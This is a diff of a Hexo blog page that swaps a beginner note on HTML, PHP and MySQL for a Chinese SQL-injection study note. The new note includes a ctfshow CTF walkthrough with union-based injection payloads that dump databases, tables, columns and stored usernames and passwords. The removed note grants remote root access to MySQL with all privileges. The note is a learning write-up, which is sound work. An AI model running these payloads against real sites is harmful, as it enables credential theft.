@@ -25,22 +25,29 @@
   
 <link rel="stylesheet" href="/css/loader.css">
 
-  <meta name="description" content="-html !+tab键   一键生成html框架（在vs code里，文件后缀为php） Document&#x2F;&#x2F;次为标题如 123&lt;body&gt;    &lt;&#x2F;body&gt; 主体内可以用标签，或加入其他的元素。也可以在里面写一些其他语言如php如 内嵌网站 &#x2F;&#x2F;为块，块在主体里，然后可以通过给块赋予名称 在标签里可以设置块    方法为：#+块名{}在头里面">
+  <meta name="description" content="什么是sql注入（原理）在数据交互的过程中，前端的数据传递到后端处理时没有做好判断，导致传入时的数据拼接到了失去了注入语句，被当作sql语句执行  常用的拼接符号： ‘ ‘,””, (“”) ,  – - 常用的连接词 union and or  sql注入是基于数据库语言来的在MySQL中通常会有一个数据库的存在，它储存了所有的库，表，内容，字段名称为：information_schema  其">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/2024/07/13/7.12%20%20html%20php%20mysql/index.html">
+<meta property="og:url" content="http://example.com/2024/07/22/7.22%20sql%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="-html !+tab键   一键生成html框架（在vs code里，文件后缀为php） Document&#x2F;&#x2F;次为标题如 123&lt;body&gt;    &lt;&#x2F;body&gt; 主体内可以用标签，或加入其他的元素。也可以在里面写一些其他语言如php如 内嵌网站 &#x2F;&#x2F;为块，块在主体里，然后可以通过给块赋予名称 在标签里可以设置块    方法为：#+块名{}在头里面">
+<meta property="og:description" content="什么是sql注入（原理）在数据交互的过程中，前端的数据传递到后端处理时没有做好判断，导致传入时的数据拼接到了失去了注入语句，被当作sql语句执行  常用的拼接符号： ‘ ‘,””, (“”) ,  – - 常用的连接词 union and or  sql注入是基于数据库语言来的在MySQL中通常会有一个数据库的存在，它储存了所有的库，表，内容，字段名称为：information_schema  其">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46252388/1720749517867-35660007-d063-4f20-a203-d643f03e9438.png#averageHue=%23e6e6e6&clientId=ucea227a6-1726-4&from=paste&height=32&id=ue442ac99&originHeight=48&originWidth=361&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=2925&status=done&style=none&taskId=u7a6ff56d-cc4d-48b0-b019-b3993f6296e&title=&width=240.66666666666666">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46252388/1720749453464-d8792e63-1e98-46e8-bcb1-04f7a52b4762.png#averageHue=%23050302&clientId=ucea227a6-1726-4&from=paste&height=297&id=ub3b4b5a1&originHeight=445&originWidth=1584&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=88919&status=done&style=none&taskId=uff367e5f-f6f2-4e1d-932c-9fca28fcecd&title=&width=1056">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46252388/1720751635298-6a08655e-569c-4710-b7b2-dd6ace964a17.png#averageHue=%23293138&clientId=u01a92049-4110-4&from=paste&height=29&id=u9d640669&originHeight=43&originWidth=737&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=17772&status=done&style=none&taskId=uf92f4c5c-ab12-4b95-bcf1-9dc9824363d&title=&width=491.3333333333333">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46252388/1720765811729-49f74ea6-5a87-48f4-87e9-e3410871741d.png#averageHue=%232d3026&clientId=u01a92049-4110-4&from=paste&height=23&id=uf6bbea7d&originHeight=34&originWidth=358&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=10245&status=done&style=none&taskId=u80e74218-fee1-44b9-a447-aedaebfa4d1&title=&width=238.66666666666666">
-<meta property="article:published_time" content="2024-07-13T12:26:17.807Z">
-<meta property="article:modified_time" content="2024-07-13T11:06:27.616Z">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46252388/1721646726767-404d8dcb-3079-4d3b-bb0b-846725f1546a.png#averageHue=%23131313&clientId=uf72f2e4d-74fc-4&from=paste&height=228&id=uc130603f&originHeight=342&originWidth=934&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=19035&status=done&style=none&taskId=uf7d9e147-08a4-4d25-9e1f-fd73c8c3ee6&title=&width=622.6666666666666">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46252388/1721646749250-fbff94f8-a700-474e-9ff2-b559a95f7c5b.png#averageHue=%23121212&clientId=uf72f2e4d-74fc-4&from=paste&height=283&id=ubfad3bdd&originHeight=425&originWidth=1460&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=32472&status=done&style=none&taskId=u8532f613-341b-41c0-8ae3-cb99ef8c8bf&title=&width=973.3333333333334">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46252388/1721647118726-57b588c0-18ca-45d7-88d8-7623ef0098af.png#averageHue=%23111111&clientId=uf72f2e4d-74fc-4&from=paste&height=151&id=u742366cc&originHeight=226&originWidth=1665&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=13974&status=done&style=none&taskId=u79d3f6ec-8b14-4a5e-83c0-5c2db4fcc47&title=&width=1110">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46252388/1721647296376-277cecf9-ba71-4ee2-8b5b-cae00a548b3a.png#averageHue=%23141414&clientId=uf72f2e4d-74fc-4&from=paste&height=143&id=u0750434f&originHeight=214&originWidth=1069&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=41288&status=done&style=none&taskId=u008fc7ea-05db-4bb9-a0d3-7a4c1e9e412&title=&width=712.6666666666666">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46252388/1721647594642-6389e0f7-1656-4903-bcf4-d574c40638a2.png#averageHue=%23f4f3f3&clientId=uf72f2e4d-74fc-4&from=paste&height=303&id=ua97ac39f&originHeight=503&originWidth=1077&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=20666&status=done&style=none&taskId=u854e7c35-c3d5-4274-b085-8b912920291&title=&width=649.3333740234375">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46252388/1721647918355-c6a6961a-b468-4bcb-bd0f-85392917d8ba.png#averageHue=%23fbfbfb&clientId=uf72f2e4d-74fc-4&from=paste&height=71&id=u52c7a2c8&originHeight=311&originWidth=1315&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=9598&status=done&style=none&taskId=ub56bd8cd-84c7-4c00-972a-a4263052974&title=&width=301.3333435058594">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46252388/1721647939825-cdd71ab7-c14a-4514-bef2-8abcfecf5d2e.png#averageHue=%23fbfafa&clientId=uf72f2e4d-74fc-4&from=paste&height=52&id=u9a243129&originHeight=248&originWidth=1473&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=12934&status=done&style=none&taskId=u20259d66-2723-49ea-81f6-83921d7ed30&title=&width=309.3333435058594">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46252388/1721648040954-72602b92-770c-4eb1-86d3-b671b27edfe1.png#averageHue=%23f9f8f7&clientId=uf72f2e4d-74fc-4&from=paste&height=188&id=u5410ce1a&originHeight=282&originWidth=961&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=22339&status=done&style=none&taskId=ucc09d87b-56c8-4b2c-b2e1-926e3d22af0&title=&width=640.6666666666666">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46252388/1721648315639-f493a709-2e05-46a2-86cb-268ac18bcdee.png#averageHue=%23f9f9f8&clientId=uf72f2e4d-74fc-4&from=paste&height=173&id=u0ed5d5e8&originHeight=259&originWidth=997&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=18820&status=done&style=none&taskId=uc4a8b485-6647-460f-9c99-1956a894cc3&title=&width=664.6666666666666">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46252388/1721648373796-f5226a37-4a10-4934-9836-f3b7d97b4957.png#averageHue=%23f9f8f8&clientId=uf72f2e4d-74fc-4&from=paste&height=165&id=u4059ea54&originHeight=247&originWidth=960&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=16986&status=done&style=none&taskId=ucde5c5f0-d5a6-4276-8222-63e435a8c69&title=&width=640">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2024/png/46252388/1721648428572-f1081404-2387-48e0-8aa7-f6718213de03.png#averageHue=%23f8f7f7&clientId=uf72f2e4d-74fc-4&from=paste&height=203&id=u664d4990&originHeight=305&originWidth=1029&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=30284&status=done&style=none&taskId=u653cb334-e919-4e8b-b121-60ec87568a8&title=&width=686">
+<meta property="article:published_time" content="2024-07-22T11:55:35.629Z">
+<meta property="article:modified_time" content="2024-07-22T11:55:03.833Z">
 <meta property="article:author" content="muoubenou">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2024/png/46252388/1720749517867-35660007-d063-4f20-a203-d643f03e9438.png#averageHue=%23e6e6e6&clientId=ucea227a6-1726-4&from=paste&height=32&id=ue442ac99&originHeight=48&originWidth=361&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=2925&status=done&style=none&taskId=u7a6ff56d-cc4d-48b0-b019-b3993f6296e&title=&width=240.66666666666666">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2024/png/46252388/1721646726767-404d8dcb-3079-4d3b-bb0b-846725f1546a.png#averageHue=%23131313&clientId=uf72f2e4d-74fc-4&from=paste&height=228&id=uc130603f&originHeight=342&originWidth=934&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=19035&status=done&style=none&taskId=uf7d9e147-08a4-4d25-9e1f-fd73c8c3ee6&title=&width=622.6666666666666">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -189,12 +196,12 @@
 
         <div id="content" class="outer">
           
-          <section id="main"><article id="post-7.12  html php mysql" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+          <section id="main"><article id="post-7.22 sql注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-inner">
     <div class="article-meta">
       <div class="article-date wow slideInLeft">
-  <a href="/2024/07/13/7.12%20%20html%20php%20mysql/" class="article-date-link">
-    <time datetime="2024-07-13T12:26:17.807Z" itemprop="datePublished">2024-07-13</time>
+  <a href="/2024/07/22/7.22%20sql%E6%B3%A8%E5%85%A5/" class="article-date-link">
+    <time datetime="2024-07-22T11:55:35.629Z" itemprop="datePublished">2024-07-22</time>
   </a>
 </div>
 
@@ -206,53 +213,15 @@
 
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p><strong>-html</strong></p>
-<p>!+tab键   一键生成html框架（在vs code里，文件后缀为php）<br> <title>Document</title>&#x2F;&#x2F;次为标题<br>如<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46252388/1720749517867-35660007-d063-4f20-a203-d643f03e9438.png#averageHue=%23e6e6e6&clientId=ucea227a6-1726-4&from=paste&height=32&id=ue442ac99&originHeight=48&originWidth=361&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=2925&status=done&style=none&taskId=u7a6ff56d-cc4d-48b0-b019-b3993f6296e&title=&width=240.66666666666666" alt="image.png"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    </span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
-<p>主体内可以用标签，或加入其他的元素。也可以在里面写一些其他语言如php<br>如<br><img src="https://cdn.nlark.com/yuque/0/2024/png/46252388/1720749453464-d8792e63-1e98-46e8-bcb1-04f7a52b4762.png#averageHue=%23050302&clientId=ucea227a6-1726-4&from=paste&height=297&id=ub3b4b5a1&originHeight=445&originWidth=1584&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=88919&status=done&style=none&taskId=uff367e5f-f6f2-4e1d-932c-9fca28fcecd&title=&width=1056" alt="image.png"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2024/png/46252388/1720751635298-6a08655e-569c-4710-b7b2-dd6ace964a17.png#averageHue=%23293138&clientId=u01a92049-4110-4&from=paste&height=29&id=u9d640669&originHeight=43&originWidth=737&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=17772&status=done&style=none&taskId=uf92f4c5c-ab12-4b95-bcf1-9dc9824363d&title=&width=491.3333333333333" alt="image.png"><br>内嵌网站</p>
-<div></div>//为块，块在主体里，然后可以通过<div="">给块赋予名称
-在<style></style>标签里可以设置块    方法为：#+块名{}在头里面
-
-<p>块里可以放块进行叠加</p>
-<p>html <a target="_blank" rel="noopener" href="https://www.runoob.com/html/html-layouts.html">https://www.runoob.com/html/html-layouts.html</a> 学习网站</p>
-<p><strong>php</strong></p>
-<p>php代码可以加到html框架里去，可以放到文档中的任何位置</p>
-<p>脚本以&lt;?php开始，以？&gt;结束</p>
-<p> <strong>.</strong>   符号在其中可以作为连接符号在一定场景使用<br>如：<img src="https://cdn.nlark.com/yuque/0/2024/png/46252388/1720765811729-49f74ea6-5a87-48f4-87e9-e3410871741d.png#averageHue=%232d3026&clientId=u01a92049-4110-4&from=paste&height=23&id=uf6bbea7d&originHeight=34&originWidth=358&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=10245&status=done&style=none&taskId=u80e74218-fee1-44b9-a447-aedaebfa4d1&title=&width=238.66666666666666" alt="image.png">其中br标签表示换行。<br>echo为输出一个或多个字符串</p>
-<p><strong>PHP变量</strong><br>$+字母，这些字母被称为变量。在PHP里每个变量都需要加$（赋值时，不用指定类型）<br>PHP中有全局变量定义在函数外部（**函数定义方式：function +函数名（）{}**）<br>函数内通过在调用变量前加global访问</p>
-<p>PHP中 特殊的比较有两种，松散比较使用两个&#x3D;&#x3D;，只比较值不比较类型&#x3D;&#x3D;&#x3D;：比较值也比较类型</p>
-<p>PHP中，循环语句、判断语句、数组与c++差不多。</p>
-<p><strong>PHP表单</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;菜鸟教程(runoob.com)&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">                                               //methodmethod 是指 HTML 表单的属性之一，用于指定表单提交时使用的 HTTP 方法。常见的两个取值是 GET 和 POST。GET 方法会将表单数据附加在 URL 后面，适合用于获取数据的请求。POST 方法会将表单数据放在请求的消息体中，适合用于提交数据的请求，也更安全，因为不会在 URL 中暴露数据。</span><br><span class="line">&lt;form action=&quot;welcome.php&quot; method=&quot;post&quot;&gt;      //action 指的是 HTML 表单的属性，用于指定表单提交后要执行的动作。后面写执行后传表的位置</span><br><span class="line">名字: &lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;         //input是接受用户输入的数据 </span><br><span class="line">年龄: &lt;input type=&quot;text&quot; name=&quot;age&quot;&gt;           </span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;              //用户点击提交时会触发表格的提交，value：以按钮显示文本内容</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">欢迎&lt;?php echo $_POST[&quot;fname&quot;]; ?&gt;!&lt;br&gt;</span><br><span class="line">你的年龄是 &lt;?php echo $_POST[&quot;age&quot;]; ?&gt;  岁。</span><br></pre></td></tr></table></figure>
-<p><strong>关键语法$q&#x3D;$_GET[’变量‘];或者$q&#x3D;$_POST[’变量‘];  &#x2F;&#x2F;p可变</strong></p>
-<p>若出现下列代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"> <span class="variable">$c</span>=<span class="number">1</span>;</span><br><span class="line"> <span class="variable">$d</span>=<span class="number">2</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">add</span>(<span class="variable">$c</span>,<span class="variable">$d</span>) ;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span>+<span class="variable">$b</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class="line"> <span class="variable">$q</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$q</span>;   </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>我们可以在导航那里输入？+变量名&#x3D;数值，来给[]里的变量赋值。若要输入多个变量中间加&amp;即可</p>
-<p>更多PHP的知识在</p>
-<p><strong>mysql</strong></p>
-<p>mysql的打开：找到放mysql的文件，找到他的bin文件，我的是在e盘的E:\phpstudy_pro里（小皮的）<br>然后在那里打开cmd命令，通过mysql -u root -p 其中u后面的是用户名<br>输入密码一般是root</p>
-<p>mysql基本命令<br>show databases;                           &#x2F;&#x2F;查看所有数据库<br>crete database study;                   &#x2F;&#x2F;创建study数据库<br>use study； 				      &#x2F;&#x2F;进入study数据库<br>show tables;        			      &#x2F;&#x2F;查看所有数据表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE users (</span><br><span class="line">    id INT AUTO_INCREMENT PRIMARY KEY,</span><br><span class="line">    username VARCHAR(50) NOT NULL,</span><br><span class="line">    password VARCHAR(50) NOT NULL</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-<p>int表示该段为整型，其中 auto….表示一个自动增长的段， prim….表示主键<br>var…..表示限长为50 not null表不能为空</p>
-<p>select *from user  				&#x2F;&#x2F;查看表中的所有内容<br>INSERT INTO users (username, password) VALUES (‘zhangsan’, ‘123456’);   在表中插入内容，两个字段要与定义表时一样。（看他允不允许空）</p>
-<p><code>UPDATE users SET username = &#39;admin&#39;, password = &#39;admin&#39; WHERE username = &#39;zhangsan&#39;;</code><br>修改根据where后面的字段来寻找并且更新表的内容</p>
-<p>DELETE FROM users WHERE  WHERE username &#x3D; ‘zhangsan’;              &#x2F;&#x2F;删除users表中的内容通过where后面的判断，<strong>提示</strong>如果没有判断将会把此表中的所有内容全部删除。</p>
-<p>drop table users;       			  &#x2F;&#x2F;删除users表<br>drop database study;		          &#x2F;&#x2F;删除数据库</p>
+        <p><strong>什么是sql注入（</strong>原理<strong>）</strong><br />在数据交互的过程中，前端的数据传递到后端处理时没有做好判断，导致传入时的数据拼接<br />到了失去了注入语句，被当作sql语句执行</p>
 <ol>
-<li>mysql远程连接(在mysql cmd界面 或者新建查询里输入以下命令)<ol>
-<li><code>grant all privileges on *.* to &#39;root&#39;@&#39;%&#39; identified by &#39;root&#39; with grant option;</code></li>
-<li><code>flush privileges;</code></li>
+<li>常用的拼接符号： ‘ ‘,””, (“”) ,  – -</li>
+<li>常用的连接词 union and or</li>
 </ol>
-</li>
-</ol>
-<p>数据格式</p>
-<ol>
-<li>json：</li>
-<li>xml：</li>
-<li>buf：</li>
-</ol>
+<p>sql注入是基于数据库语言来的<br />在MySQL中通常会有一个数据库的存在，它储存了所有的库，表，内容，字段<br /><strong>名称为：information_schema  其中：</strong><br />schemata 为存储 数据库的表 所以获取全部表的内容的sql语句为：<br />select  schema_name from information_schema.schemata;<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46252388/1721646726767-404d8dcb-3079-4d3b-bb0b-846725f1546a.png#averageHue=%23131313&clientId=uf72f2e4d-74fc-4&from=paste&height=228&id=uc130603f&originHeight=342&originWidth=934&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=19035&status=done&style=none&taskId=uf7d9e147-08a4-4d25-9e1f-fd73c8c3ee6&title=&width=622.6666666666666" alt="image.png"><br />tables 为储存 表  为了获取相应库的所有表 有以下语句<br />select table_name from information_schema.tables where table_schema&#x3D;’你想查询的库’;<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46252388/1721646749250-fbff94f8-a700-474e-9ff2-b559a95f7c5b.png#averageHue=%23121212&clientId=uf72f2e4d-74fc-4&from=paste&height=283&id=ubfad3bdd&originHeight=425&originWidth=1460&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=32472&status=done&style=none&taskId=u8532f613-341b-41c0-8ae3-cb99ef8c8bf&title=&width=973.3333333333334" alt="image.png"><br />columns 为字段储存的地方 ，查询你想查的特定字段语法为<br />select column_name from information_schema.columns where table_schema&#x3D;’你想查的字段的库’ and table_name&#x3D;’你想查的字段所在的表’;<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46252388/1721647118726-57b588c0-18ca-45d7-88d8-7623ef0098af.png#averageHue=%23111111&clientId=uf72f2e4d-74fc-4&from=paste&height=151&id=u742366cc&originHeight=226&originWidth=1665&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=13974&status=done&style=none&taskId=u79d3f6ec-8b14-4a5e-83c0-5c2db4fcc47&title=&width=1110" alt="image.png"></p>
+<p>union的使用：<br />union的意思为拼接，可以在后面输入新的查询或者其他语句，他会自动显示到前一语句的下面<br /><strong>注意：union的后的语句必须与它前面的语句有一样的格式</strong><br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46252388/1721647296376-277cecf9-ba71-4ee2-8b5b-cae00a548b3a.png#averageHue=%23141414&clientId=uf72f2e4d-74fc-4&from=paste&height=143&id=u0750434f&originHeight=214&originWidth=1069&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=41288&status=done&style=none&taskId=u008fc7ea-05db-4bb9-a0d3-7a4c1e9e412&title=&width=712.6666666666666" alt="image.png"><br />三列跟三列<br />为了了解前一行的列数，我们可以通过 order by +数字的方式，如果加到一定数字时页面报错了那么这个数减一就是列数。</p>
+<p>下面是sql注入的实战：<br />题目<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46252388/1721647594642-6389e0f7-1656-4903-bcf4-d574c40638a2.png#averageHue=%23f4f3f3&clientId=uf72f2e4d-74fc-4&from=paste&height=303&id=ua97ac39f&originHeight=503&originWidth=1077&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=20666&status=done&style=none&taskId=u854e7c35-c3d5-4274-b085-8b912920291&title=&width=649.3333740234375" alt="image.png"><br />解法：<br />首先看他的查询语句，发现为<br />select username,password from ctfshow_user2 where username !&#x3D;’flag’ and id &#x3D; ‘’ limit 1;<br />把中间变量删了是因为这个就是我们输入框输的。<br />然后我们输入这个语句 :         1’ order by 2 – -<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46252388/1721647918355-c6a6961a-b468-4bcb-bd0f-85392917d8ba.png#averageHue=%23fbfbfb&clientId=uf72f2e4d-74fc-4&from=paste&height=71&id=u52c7a2c8&originHeight=311&originWidth=1315&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=9598&status=done&style=none&taskId=ub56bd8cd-84c7-4c00-972a-a4263052974&title=&width=301.3333435058594" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/46252388/1721647939825-cdd71ab7-c14a-4514-bef2-8abcfecf5d2e.png#averageHue=%23fbfafa&clientId=uf72f2e4d-74fc-4&from=paste&height=52&id=u9a243129&originHeight=248&originWidth=1473&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=12934&status=done&style=none&taskId=u20259d66-2723-49ea-81f6-83921d7ed30&title=&width=309.3333435058594" alt="image.png"><br />所以列数为2<br />之后输入：1’  union select 1,group_concat(schema_name) from information_schema.schemata  – -<br />查询所有的数据库<br />select后面的1 是凑出来的列数  group_concat()函数是将一组数据进行合并并且返回字符串<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46252388/1721648040954-72602b92-770c-4eb1-86d3-b671b27edfe1.png#averageHue=%23f9f8f7&clientId=uf72f2e4d-74fc-4&from=paste&height=188&id=u5410ce1a&originHeight=282&originWidth=961&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=22339&status=done&style=none&taskId=ucc09d87b-56c8-4b2c-b2e1-926e3d22af0&title=&width=640.6666666666666" alt="image.png"><br />我们可以看到里面有特殊的数据库：ctfshow_web<br />下一步我们查看它的表：<br />1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’ctfshow_web’ – -<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46252388/1721648315639-f493a709-2e05-46a2-86cb-268ac18bcdee.png#averageHue=%23f9f9f8&clientId=uf72f2e4d-74fc-4&from=paste&height=173&id=u0ed5d5e8&originHeight=259&originWidth=997&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=18820&status=done&style=none&taskId=uc4a8b485-6647-460f-9c99-1956a894cc3&title=&width=664.6666666666666" alt="image.png"><br />之后我们查看这两个字段里面的内容：<br />1’ union select 1,group_concat(column_name) from information_schema.columns where table_schema&#x3D;’ctfshow_web’ and table_name&#x3D;’ctfshow_user’ – -<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46252388/1721648373796-f5226a37-4a10-4934-9836-f3b7d97b4957.png#averageHue=%23f9f8f8&clientId=uf72f2e4d-74fc-4&from=paste&height=165&id=u4059ea54&originHeight=247&originWidth=960&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=16986&status=done&style=none&taskId=ucde5c5f0-d5a6-4276-8222-63e435a8c69&title=&width=640" alt="image.png"><br />看它里面的内容：<br />1’ union select 1,group_concat(id,username,password) from ctfshow_web.ctfshow_user2 – -<br /><img src="https://cdn.nlark.com/yuque/0/2024/png/46252388/1721648428572-f1081404-2387-48e0-8aa7-f6718213de03.png#averageHue=%23f8f7f7&clientId=uf72f2e4d-74fc-4&from=paste&height=203&id=u664d4990&originHeight=305&originWidth=1029&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=30284&status=done&style=none&taskId=u653cb334-e919-4e8b-b121-60ec87568a8&title=&width=686" alt="image.png"><br />得到密钥flag</p>
+<p>拓展：<br />ascii()   &#x2F;&#x2F;把字符转换为数字<br />database() &#x2F;&#x2F;内置函数，获取当前数据库名<br />user()     &#x2F;&#x2F;获取当前的使用者名<br />version()  &#x2F;&#x2F;获取版本号、<br />substr(被截取的字符，开始截取的位置，截至字符串长度)   &#x2F;&#x2F;括号内是字符串，截取字符</p>
 
       
     </div>
@@ -271,22 +240,6 @@
     
   <nav id="article-nav" class="wow fadeInUp">
     
-      <div class="article-nav-link-wrap article-nav-link-left">
-        
-          
-          
-            <img data-src="/images/banner.webp" data-sizes="auto" alt="" class="lazyload">
-          
-        
-        <a href="/2024/07/13/7.13%20%20%E7%BD%91%E7%AB%99%E7%9A%84%E6%90%AD%E5%BB%BA/"></a>
-        <div class="article-nav-caption">Newer</div>
-        <h3 class="article-nav-title">
-          
-            (no title)
-          
-        </h3>
-      </div>
-    
     
     <div class="article-nav-link-wrap article-nav-link-right">
       
@@ -295,7 +248,7 @@
           <img data-src="/images/banner.webp" data-sizes="auto" alt="" class="lazyload">
         
       
-      <a href="/2024/07/13/7.11%20%20%E5%8D%9A%E5%AE%A2%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E3%80%81%E8%BD%AF%E4%BB%B6%E6%8D%86%E7%BB%91%E3%80%81%E8%BD%AF%E4%BB%B6%E5%9B%BE%E6%A0%87%E6%9B%B4%E6%94%B9%E3%80%81%E8%87%AA%E8%AE%BF%E7%BD%91%E7%AB%99%E7%9A%84%E6%90%AD%E5%BB%BA%E3%80%81%E7%A4%BE%E5%B7%A5%E5%BA%93/"></a>
+      <a href="/2024/07/22/7.21%207.22%20%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%8C%96%E6%8E%98/"></a>
       <div class="article-nav-caption">Older</div>
       <h3 class="article-nav-title">
         
